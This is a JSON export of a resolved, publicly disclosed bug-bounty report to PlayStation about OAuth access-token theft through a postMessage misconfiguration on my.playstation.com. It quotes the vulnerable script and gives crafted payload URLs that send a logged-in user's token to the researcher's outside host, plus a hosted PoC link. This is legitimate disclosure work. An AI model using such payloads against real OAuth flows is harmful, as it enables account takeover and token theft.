{"id":821896,"global_id":"Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC84MjE4OTY=","url":"https://hackerone.com/reports/821896","title":"Access token stealing.","state":"Closed","substate":"resolved","severity_rating":"high","readable_substate":"Resolved","created_at":"2020-03-16T21:23:42.605Z","submitted_at":"2020-03-16T21:23:42.605Z","is_member_of_team?":false,"reporter":{"disabled":false,"username":"bugdiscloseguys","url":"/bugdiscloseguys","profile_picture_urls":{"small":"https://profile-photos.hackerone-user-content.com/variants/xVUwqLPZMRzBgybFxVY3ec6o/3afcb5c896247e7ee8ada31b1c1eb8657e22241f911093acfe4ec7e97a3a959a"},"is_me?":false,"cleared":true,"hackerone_triager":false,"hacker_mediation":false},"team":{"id":44879,"url":"https://hackerone.com/playstation","handle":"playstation","profile_picture_urls":{"small":"https://profile-photos.hackerone-user-content.com/variants/8uyqZE6d69UGEYq8qwzS4Z3Q/3afcb5c896247e7ee8ada31b1c1eb8657e22241f911093acfe4ec7e97a3a959a","medium":"https://profile-photos.hackerone-user-content.com/variants/8uyqZE6d69UGEYq8qwzS4Z3Q/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"permissions":[],"submission_state":"open","default_currency":"usd","awards_miles":false,"offers_bounties":true,"state":"public_mode","only_cleared_hackers":false,"profile":{"name":"PlayStation","twitter_handle":"PlayStation","website":"https://www.playstation.com","about":"Recognized as a global leader in interactive and digital entertainment, Sony Interactive Entertainment (SIE) is responsible for the PlayStation brand."}},"has_bounty?":true,"in_validation?":false,"rejected_anc_report_that_can_be_sent_back_to_anc_triagers?":false,"can_view_team":true,"can_view_report":true,"is_external_bug":false,"is_published":false,"is_participant":false,"stage":4,"public":true,"visibility":"no-content","cve_ids":[],"singular_disclosure_disabled":true,"disclosed_at":"2020-11-21T00:36:00.518Z","bug_reporter_agreed_on_going_public_at":"2020-07-30T19:24:23.833Z","team_member_agreed_on_going_public_at":"2020-11-21T00:36:00.378Z","comments_closed?":false,"facebook_team?":false,"team_private?":false,"vulnerability_information":"","vulnerability_information_html":"","bounty_amount":"1200.0","formatted_bounty":"$1,200","weakness":{"id":152,"name":"Missing Authorization"},"original_report_id":null,"original_report_url":null,"attachments":[],"allow_singular_disclosure_at":null,"vote_count":130,"voters":["mashoud1122","kapkan","newbipath12","prophet","rahsec","zeroxyele","mygf","samet","mainteemoforfun","aryan2808","and 120 more..."],"severity":{"rating":"high","score":8.1,"author_type":"User","metrics":{"attack_vector":"network","attack_complexity":"low","privileges_required":"none","user_interaction":"required","scope":"unchanged","confidentiality":"high","integrity":"high","availability":"none"}},"structured_scope":{"databaseId":40731,"asset_type":"URL","asset_identifier":"my.playstation.com","max_severity":"critical"},"abilities":{"assignable_team_members":[],"assignable_team_member_groups":[]},"can_edit_custom_fields_attributes":false,"activities":[{"id":7340628,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"","markdown_message":"","automated_response":false,"created_at":"2020-03-17T07:57:37.271Z","updated_at":"2020-03-17T07:57:37.271Z","actor":{"username":"chinch1lla","cleared":false,"url":"/chinch1lla","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/3PY2FU5wvpPhJAVRPEwkHabD/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":true,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"playstation","actor_is_team_member":true,"actor_is_concealed_member":true},{"id":7358430,"is_internal":false,"editable":false,"type":"Activities::BugTriaged","message":"","markdown_message":"","automated_response":false,"created_at":"2020-03-18T17:48:28.760Z","updated_at":"2020-03-18T17:48:28.760Z","actor":{"username":"sdredneck","cleared":false,"url":"/sdredneck","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"playstation","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":7382474,"is_internal":false,"editable":false,"type":"Activities::BountyAwarded","message":"","markdown_message":"","automated_response":false,"created_at":"2020-03-21T02:24:07.864Z","updated_at":"2020-03-21T02:24:07.864Z","actor":{"url":"/playstation","ibb":false,"profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/8uyqZE6d69UGEYq8qwzS4Z3Q/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"profile":{"name":"PlayStation"}},"bounty_amount":"1200.0","bounty_currency":"usd","bonus_amount":"0.0","genius_execution_id":null,"team_handle":"playstation","collaborator":{"username":"bugdiscloseguys","url":"/bugdiscloseguys"},"actor_is_team_member":true,"actor_is_concealed_member":false},{"id":8255204,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"","markdown_message":"","automated_response":false,"created_at":"2020-06-10T14:46:26.334Z","updated_at":"2020-06-10T14:46:26.334Z","actor":{"username":"antenna","cleared":false,"url":"/antenna","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/B1a8q5ga9BZjMczKoqAbnMj5/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":true,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"playstation","actor_is_team_member":true,"actor_is_concealed_member":true},{"id":8395615,"is_internal":false,"editable":false,"type":"Activities::BugNeedsMoreInfo","message":"","markdown_message":"","automated_response":false,"created_at":"2020-06-24T14:15:17.298Z","updated_at":"2020-06-24T14:15:17.298Z","actor":{"username":"antenna","cleared":false,"url":"/antenna","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/B1a8q5ga9BZjMczKoqAbnMj5/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":true,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"playstation","actor_is_team_member":true,"actor_is_concealed_member":true},{"id":8420757,"is_internal":false,"editable":false,"type":"Activities::BugNew","message":"","markdown_message":"","automated_response":false,"created_at":"2020-06-26T16:08:03.994Z","updated_at":"2020-06-26T16:08:03.994Z","actor":{"username":"bugdiscloseguys","cleared":true,"url":"/bugdiscloseguys","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/xVUwqLPZMRzBgybFxVY3ec6o/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"playstation","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":8422920,"is_internal":false,"editable":false,"type":"Activities::BugTriaged","message":"","markdown_message":"","automated_response":false,"created_at":"2020-06-26T19:13:38.539Z","updated_at":"2020-06-26T19:15:22.169Z","actor":{"username":"antenna","cleared":false,"url":"/antenna","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/B1a8q5ga9BZjMczKoqAbnMj5/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":true,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"playstation","actor_is_team_member":true,"actor_is_concealed_member":true},{"id":8789810,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"","markdown_message":"","automated_response":false,"created_at":"2020-07-29T08:56:16.896Z","updated_at":"2020-07-29T08:56:16.896Z","actor":{"username":"bugdiscloseguys","cleared":true,"url":"/bugdiscloseguys","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/xVUwqLPZMRzBgybFxVY3ec6o/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"playstation","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":8808555,"is_internal":false,"editable":false,"type":"Activities::BugResolved","message":"","markdown_message":"","automated_response":false,"created_at":"2020-07-30T19:01:26.233Z","updated_at":"2020-07-30T19:01:26.233Z","actor":{"username":"shoshin_cup","cleared":false,"url":"/shoshin_cup","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/541/482/8f92ed5cbd717ef451a19e817cb5e058a7ad3127_original.jpg/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":null},"reporter":{"username":"bugdiscloseguys","url":"/bugdiscloseguys"},"genius_execution_id":null,"team_handle":"playstation","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":8808774,"is_internal":false,"editable":false,"type":"Activities::AgreedOnGoingPublic","message":"","markdown_message":"","automated_response":false,"created_at":"2020-07-30T19:24:23.852Z","updated_at":"2020-07-30T19:24:23.852Z","first_to_agree":true,"actor":{"username":"bugdiscloseguys","cleared":true,"url":"/bugdiscloseguys","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/xVUwqLPZMRzBgybFxVY3ec6o/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"playstation","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":8808780,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"","markdown_message":"","automated_response":false,"created_at":"2020-07-30T19:24:56.612Z","updated_at":"2020-07-30T19:24:56.612Z","actor":{"username":"bugdiscloseguys","cleared":true,"url":"/bugdiscloseguys","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/xVUwqLPZMRzBgybFxVY3ec6o/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"playstation","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":8981062,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"","markdown_message":"","automated_response":false,"created_at":"2020-08-19T17:21:16.054Z","updated_at":"2020-08-19T17:25:14.412Z","actor":{"username":"serv","cleared":false,"url":"/serv","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/Rs7SWj52yyghzz7wN6DUx7Dw/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":true},"genius_execution_id":null,"team_handle":"playstation","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":8991564,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"","markdown_message":"","automated_response":false,"created_at":"2020-08-20T16:32:10.413Z","updated_at":"2020-08-20T16:32:10.413Z","actor":{"username":"bugdiscloseguys","cleared":true,"url":"/bugdiscloseguys","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/xVUwqLPZMRzBgybFxVY3ec6o/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"playstation","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":9883839,"is_internal":false,"editable":false,"type":"Activities::AgreedOnGoingPublic","message":"","markdown_message":"","automated_response":false,"created_at":"2020-11-21T00:36:00.402Z","updated_at":"2020-11-21T00:36:00.402Z","actor":{"username":"serv","cleared":false,"url":"/serv","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/Rs7SWj52yyghzz7wN6DUx7Dw/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":true},"genius_execution_id":null,"team_handle":"playstation","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":9883840,"is_internal":false,"editable":false,"type":"Activities::ReportBecamePublic","message":"","markdown_message":"","automated_response":false,"created_at":"2020-11-21T00:36:00.547Z","updated_at":"2020-11-21T00:36:00.547Z","actor":{"username":"serv","cleared":false,"url":"/serv","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/Rs7SWj52yyghzz7wN6DUx7Dw/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":true},"genius_execution_id":null,"team_handle":"playstation","actor_is_team_member":true,"actor_is_concealed_member":false}],"activity_page_count":1,"activity_page_number":1,"summaries":[{"id":25534,"category":"team","content":"# Summary:\n`https://my.playstation.com/auth/response.html` suffers from a misconfiguration which leads to access token stealing.\n\n# Description:\nThe page `https://my.playstation.com/auth/response.html?requestID=iframe_request_ca8b5107-9b8f-4510-9667-15fd7b9327d1\u0026baseUrl=/\u0026targetOrigin=https://my.playstation.com` hosts a javascript which is responsible for transferring OAuth access token from the issuing server to the client.\n\nOn analyzing this javascript we found an issue which leads to an access token stealing.\n\n```\n    function parseResponse(a) {\n    var b = a.hash.substr(1),\n        c = a.search.substr(1),\n        d = b + \"\u0026\" + c,\n        e = convertToObject(d);\n    return e.refererURL = a.toString(), e\n}\n\n....\n....\n....\nfunction sendResponseToApp(a) {\n    var b = extractFrameTypeFromRequestID(a.requestID),\n        c = a.targetOrigin || getOrigin(),\n        d = a.baseUrl || \"\",\n        e = a.returnRoute || \"\",\n        f = a.excludeQueryParams,\n        g = !f \u0026\u0026 window.location.search || \"\";\n    switch (b) {\n        case \"iframe\":\n            window.parent.postMessage(a, c);\n            break;\n        case \"window\":\n            window.opener.postMessage(a, c);\n            break;\n        case \"external\":\n        default:\n            var h = constructUrl(c, d, e) + g;\n            /^(https:\\/\\/)([a-z0-9\\-]+\\.)+(playstation\\.com)(:([0-9]){4})?\\//.test(h) ?\n             window.location.href = h : window.location.href = \"https://playstation.com/error\"\n    }\n}\n\n\nvar response = parseResponse(window.location);\nsendResponseToApp(response);\n```\n\n```\nvar b = extractFrameTypeFromRequestID(a.requestID),\n...\nswitch (b)\n  case \"window\":\n            window.opener.postMessage(a, c);\n            break;\n```\n\nTo get into the window case we need to start the requestID parameter value from `window` keyword.\na =\u003e window.location\nc =\u003e a.targetOrigin which is the query parameter `targetOrigin` extracted using the function parseResponse.\na,c are passed to window.opener.postMessage() which takes the first argument as the message itself and second as the origin where to send the message.\n\nOur payload URL will become something like this: https://my.playstation.com/auth/response.html?requestID=window_request_ca8b5107-9b8f-4510-9667-15fd7b9327d1\u0026baseUrl=/\u0026targetOrigin=https://rce.ee/\n\nWe pass this payload URL to the OAuth issuing server: https://auth.api.sonyentertainmentnetwork.com/2.0/oauth/authorize?response_type=token\u0026scope=capone%3Areport_submission%2Ckamaji%3Agame_list%2Ckamaji%3Aget_account_hash%2Cuser%3Aaccount.get%2Cuser%3Aaccount.profile.get%2Ckamaji%3Asocial_get_graph%2Ckamaji%3Augc%3Adistributor%2Cuser%3Aaccount.identityMapper%2Ckamaji%3Amusic_views%2Ckamaji%3Aactivity_feed_get_feed_privacy%2Ckamaji%3Aactivity_feed_get_news_feed%2Ckamaji%3Aactivity_feed_submit_feed_story%2Ckamaji%3Aactivity_feed_internal_feed_submit_story%2Ckamaji%3Aaccount_link_token_web%2Ckamaji%3Augc%3Adistributor_web%2Ckamaji%3Aurl_preview\u0026client_id=656ace0b-d627-47e6-915c-13b259cd06b2\u0026redirect_uri=https%3a//my.playstation.com/auth/response.html%3frequestID%3dwindow_request_ca8b5107-9b8f-4510-9667-15fd7b9327d1%26baseUrl%3d/%26targetOrigin%3dhttps%3a//rce.ee/\u0026prompt=none\n\nHere's the final PoC : https://rce.ee/psoauthbypass1007.html\n\n# Steps to reproduce:\nOpen https://playstation.com/\nLogin with your account\nOpen and click! https://rce.ee/psoauthbypass1007.html\n\n# Impact\nAccess token stealing/account takeover.","can_view?":true,"can_edit?":false,"content_html":"\u003ch1 id=\"summary\"\u003eSummary:\u003c/h1\u003e\n\n\u003cp\u003e\u003ccode\u003ehttps://my.playstation.com/auth/response.html\u003c/code\u003e suffers from a misconfiguration which leads to access token stealing.\u003c/p\u003e\n\n\u003ch1 id=\"description\"\u003eDescription:\u003c/h1\u003e\n\n\u003cp\u003eThe page \u003ccode\u003ehttps://my.playstation.com/auth/response.html?requestID=iframe_request_ca8b5107-9b8f-4510-9667-15fd7b9327d1\u0026amp;baseUrl=/\u0026amp;targetOrigin=https://my.playstation.com\u003c/code\u003e hosts a javascript which is responsible for transferring OAuth access token from the issuing server to the client.\u003c/p\u003e\n\n\u003cp\u003eOn analyzing this javascript we found an issue which leads to an access token stealing.\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight plaintext\"\u003e\u003ccode\u003e    function parseResponse(a) {\n    var b = a.hash.substr(1),\n        c = a.search.substr(1),\n        d = b + \u0026quot;\u0026amp;\u0026quot; + c,\n        e = convertToObject(d);\n    return e.refererURL = a.toString(), e\n}\n\n....\n....\n....\nfunction sendResponseToApp(a) {\n    var b = extractFrameTypeFromRequestID(a.requestID),\n        c = a.targetOrigin || getOrigin(),\n        d = a.baseUrl || \u0026quot;\u0026quot;,\n        e = a.returnRoute || \u0026quot;\u0026quot;,\n        f = a.excludeQueryParams,\n        g = !f \u0026amp;\u0026amp; window.location.search || \u0026quot;\u0026quot;;\n    switch (b) {\n        case \u0026quot;iframe\u0026quot;:\n            window.parent.postMessage(a, c);\n            break;\n        case \u0026quot;window\u0026quot;:\n            window.opener.postMessage(a, c);\n            break;\n        case \u0026quot;external\u0026quot;:\n        default:\n            var h = constructUrl(c, d, e) + g;\n            /^(https:\\/\\/)([a-z0-9\\-]+\\.)+(playstation\\.com)(:([0-9]){4})?\\//.test(h) ?\n             window.location.href = h : window.location.href = \u0026quot;https://playstation.com/error\u0026quot;\n    }\n}\n\n\nvar response = parseResponse(window.location);\nsendResponseToApp(response);\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight plaintext\"\u003e\u003ccode\u003evar b = extractFrameTypeFromRequestID(a.requestID),\n...\nswitch (b)\n  case \u0026quot;window\u0026quot;:\n            window.opener.postMessage(a, c);\n            break;\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cp\u003eTo get into the window case we need to start the requestID parameter value from \u003ccode\u003ewindow\u003c/code\u003e keyword.\u003cbr\u003e\na =\u0026gt; window.location\u003cbr\u003e\nc =\u0026gt; a.targetOrigin which is the query parameter \u003ccode\u003etargetOrigin\u003c/code\u003e extracted using the function parseResponse.\u003cbr\u003e\na,c are passed to window.opener.postMessage() which takes the first argument as the message itself and second as the origin where to send the message.\u003c/p\u003e\n\n\u003cp\u003eOur payload URL will become something like this: \u003ca title=\"https://my.playstation.com/auth/response.html?requestID=window_request_ca8b5107-9b8f-4510-9667-15fd7b9327d1\u0026amp;baseUrl=/\u0026amp;targetOrigin=https://rce.ee/\" href=\"/redirect?url=https%3A%2F%2Fmy.playstation.com%2Fauth%2Fresponse.html%3FrequestID%3Dwindow_request_ca8b5107-9b8f-4510-9667-15fd7b9327d1%26baseUrl%3D%2F%26targetOrigin%3Dhttps%3A%2F%2Frce.ee%2F\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"\u003e\u003cspan\u003ehttps://my.playstation.com/auth/response.html?requestID=window_request_ca8b5107-9b8f-4510-9667-15fd7b9327d1\u0026amp;baseUrl=/\u0026amp;targetOrigin=https://rce.ee/\u003c/span\u003e\u003ci class=\"icon-external-link\"\u003e\u003c/i\u003e\u003c/a\u003e\u003c/p\u003e\n\n\u003cp\u003eWe pass this payload URL to the OAuth issuing server: \u003ca title=\"https://auth.api.sonyentertainmentnetwork.com/2.0/oauth/authorize?response_type=token\u0026amp;scope=capone%3Areport_submission%2Ckamaji%3Agame_list%2Ckamaji%3Aget_account_hash%2Cuser%3Aaccount.get%2Cuser%3Aaccount.profile.get%2Ckamaji%3Asocial_get_graph%2Ckamaji%3Augc%3Adistributor%2Cuser%3Aaccount.identityMapper%2Ckamaji%3Amusic_views%2Ckamaji%3Aactivity_feed_get_feed_privacy%2Ckamaji%3Aactivity_feed_get_news_feed%2Ckamaji%3Aactivity_feed_submit_feed_story%2Ckamaji%3Aactivity_feed_internal_feed_submit_story%2Ckamaji%3Aaccount_link_token_web%2Ckamaji%3Augc%3Adistributor_web%2Ckamaji%3Aurl_preview\u0026amp;client_id=656ace0b-d627-47e6-915c-13b259cd06b2\u0026amp;redirect_uri=https%3a//my.playstation.com/auth/response.html%3frequestID%3dwindow_request_ca8b5107-9b8f-4510-9667-15fd7b9327d1%26baseUrl%3d/%26targetOrigin%3dhttps%3a//rce.ee/\u0026amp;prompt=none\" href=\"/redirect?url=https%3A%2F%2Fauth.api.sonyentertainmentnetwork.com%2F2.0%2Foauth%2Fauthorize%3Fresponse_type%3Dtoken%26scope%3Dcapone%253Areport_submission%252Ckamaji%253Agame_list%252Ckamaji%253Aget_account_hash%252Cuser%253Aaccount.get%252Cuser%253Aaccount.profile.get%252Ckamaji%253Asocial_get_graph%252Ckamaji%253Augc%253Adistributor%252Cuser%253Aaccount.identityMapper%252Ckamaji%253Amusic_views%252Ckamaji%253Aactivity_feed_get_feed_privacy%252Ckamaji%253Aactivity_feed_get_news_feed%252Ckamaji%253Aactivity_feed_submit_feed_story%252Ckamaji%253Aactivity_feed_internal_feed_submit_story%252Ckamaji%253Aaccount_link_token_web%252Ckamaji%253Augc%253Adistributor_web%252Ckamaji%253Aurl_preview%26client_id%3D656ace0b-d627-47e6-915c-13b259cd06b2%26redirect_uri%3Dhttps%253a%2F%2Fmy.playstation.com%2Fauth%2Fresponse.html%253frequestID%253dwindow_request_ca8b5107-9b8f-4510-9667-15fd7b9327d1%2526baseUrl%253d%2F%2526targetOrigin%253dhttps%253a%2F%2Frce.ee%2F%26prompt%3Dnone\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"\u003e\u003cspan\u003ehttps://auth.api.sonyentertainmentnetwork.com/2.0/oauth/authorize?response_type=token\u0026amp;scope=capone%3Areport_submission%2Ckamaji%3Agame_list%2Ckamaji%3Aget_account_hash%2Cuser%3Aaccount.get%2Cuser%3Aaccount.profile.get%2Ckamaji%3Asocial_get_graph%2Ckamaji%3Augc%3Adistributor%2Cuser%3Aaccount.identityMapper%2Ckamaji%3Amusic_views%2Ckamaji%3Aactivity_feed_get_feed_privacy%2Ckamaji%3Aactivity_feed_get_news_feed%2Ckamaji%3Aactivity_feed_submit_feed_story%2Ckamaji%3Aactivity_feed_internal_feed_submit_story%2Ckamaji%3Aaccount_link_token_web%2Ckamaji%3Augc%3Adistributor_web%2Ckamaji%3Aurl_preview\u0026amp;client_id=656ace0b-d627-47e6-915c-13b259cd06b2\u0026amp;redirect_uri=https%3a//my.playstation.com/auth/response.html%3frequestID%3dwindow_request_ca8b5107-9b8f-4510-9667-15fd7b9327d1%26baseUrl%3d/%26targetOrigin%3dhttps%3a//rce.ee/\u0026amp;prompt=none\u003c/span\u003e\u003ci class=\"icon-external-link\"\u003e\u003c/i\u003e\u003c/a\u003e\u003c/p\u003e\n\n\u003cp\u003eHere\u0026#39;s the final PoC : \u003ca title=\"https://rce.ee/psoauthbypass1007.html\" href=\"/redirect?url=https%3A%2F%2Frce.ee%2Fpsoauthbypass1007.html\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"\u003e\u003cspan\u003ehttps://rce.ee/psoauthbypass1007.html\u003c/span\u003e\u003ci class=\"icon-external-link\"\u003e\u003c/i\u003e\u003c/a\u003e\u003c/p\u003e\n\n\u003ch1 id=\"steps-to-reproduce\"\u003eSteps to reproduce:\u003c/h1\u003e\n\n\u003cp\u003eOpen \u003ca title=\"https://playstation.com/\" href=\"/redirect?url=https%3A%2F%2Fplaystation.com%2F\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"\u003e\u003cspan\u003ehttps://playstation.com/\u003c/span\u003e\u003ci class=\"icon-external-link\"\u003e\u003c/i\u003e\u003c/a\u003e\u003cbr\u003e\nLogin with your account\u003cbr\u003e\nOpen and click! \u003ca title=\"https://rce.ee/psoauthbypass1007.html\" href=\"/redirect?url=https%3A%2F%2Frce.ee%2Fpsoauthbypass1007.html\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"\u003e\u003cspan\u003ehttps://rce.ee/psoauthbypass1007.html\u003c/span\u003e\u003ci class=\"icon-external-link\"\u003e\u003c/i\u003e\u003c/a\u003e\u003c/p\u003e\n\n\u003ch1 id=\"impact\"\u003eImpact\u003c/h1\u003e\n\n\u003cp\u003eAccess token stealing/account takeover.\u003c/p\u003e\n"},{"id":25535,"category":"researcher","content":"This was found In collaboration with @iamnoooob.","can_view?":true,"can_edit?":false,"content_html":"\u003cp\u003eThis was found In collaboration with \u003ca href=\"/iamnoooob\"\u003e@iamnoooob\u003c/a\u003e.\u003c/p\u003e\n"}]}